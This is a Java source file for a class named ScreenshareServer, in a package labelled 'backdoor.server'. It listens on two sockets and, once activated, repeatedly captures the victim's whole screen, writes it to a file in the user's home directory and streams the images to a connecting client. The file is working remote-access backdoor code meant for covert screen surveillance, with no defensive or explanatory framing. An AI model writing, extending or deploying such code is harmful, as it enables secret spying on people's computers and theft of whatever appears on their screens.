package net.jaguargaming.backdoor.server;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;

import javax.imageio.ImageIO;

public class ScreenshareServer {
	
	Thread screenshareThread;
	Robot robot;
	
	ServerSocket ss;
	Socket s;
	DataInputStream din;
	DataOutputStream dout;
	BufferedWriter bufout;
	
	ServerSocket ss2;
	Socket s2;
	DataInputStream din2;
	DataOutputStream dout2;
	
	boolean active;
	
	public ScreenshareServer(int port) {
		try {
			ss = new ServerSocket(port);
			ss2 = new ServerSocket(6766);
			Thread acceptThread = new Thread(new Runnable() {

				@Override
				public void run() {
					try {
						s = ss.accept();
						din = new DataInputStream(s.getInputStream());
						dout = new DataOutputStream(s.getOutputStream());
						s2 = ss2.accept();
						din2 = new DataInputStream(s2.getInputStream());
						dout2 = new DataOutputStream(s2.getOutputStream());
						bufout = new BufferedWriter(new OutputStreamWriter(dout));
					} catch (IOException e) {
						e.printStackTrace();
					}
					
				}
				
			});
			acceptThread.start();
			
			active = false;
			
			robot = new Robot();
			screenshareThread = new Thread(new Runnable() {

				@Override
				public void run() {
					BufferedReader in = null;
					while (true) {
						if (active) {
							try {
								Rectangle screenSize = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
								BufferedImage screenshot = robot.createScreenCapture(screenSize);
								ImageIO.write(screenshot, "png", new File(System.getProperty("user.home") + "/bdscreenshot.png"));
								Thread.sleep(20L);
								say("start screenshot send");
								if (din2.readUTF().equalsIgnoreCase("screenshot receive ready")) {
									FileInputStream fin = new FileInputStream(new File(System.getProperty("user.home") + "/bdscreenshot.png"));
									byte b[] = new byte[1024];
									int read;
									while ((read = fin.read(b)) != -1) {
										dout.write(b, 0, read);
										dout.flush();
									}
									fin.close();
									say("end screenshot send");
									din2.readUTF();
									Thread.sleep(10L);
								} else {
									System.out.println("Unexpected awnser by client");
								}
							} catch (IOException e) {
								e.printStackTrace();
							} catch (InterruptedException e) {
								e.printStackTrace();
							} finally {
								if (in != null) {
									try {
										in.close();
									} catch (IOException e) {
										e.printStackTrace();
									}
								}
							}
						} else {
							try {
								Thread.sleep(2500L);
							} catch (InterruptedException e) {
								e.printStackTrace();
							}
						}
					}
				}
				
			});
			screenshareThread.start();
			
		} catch (IOException e) {
			e.printStackTrace();
		} catch (AWTException e) {
			e.printStackTrace();
		} 
	}
	
	public void startScreenShare() {
		active = true;
		System.out.println("Screenshare started");
	}
	
	public void stopScreenShare() {
		active = false;
	}
	
	private void say(String s) throws IOException {
		try {
			dout2.writeUTF(s);
			dout2.flush();
		} catch (IOException e) {
			throw e;
		}
	}
	
}
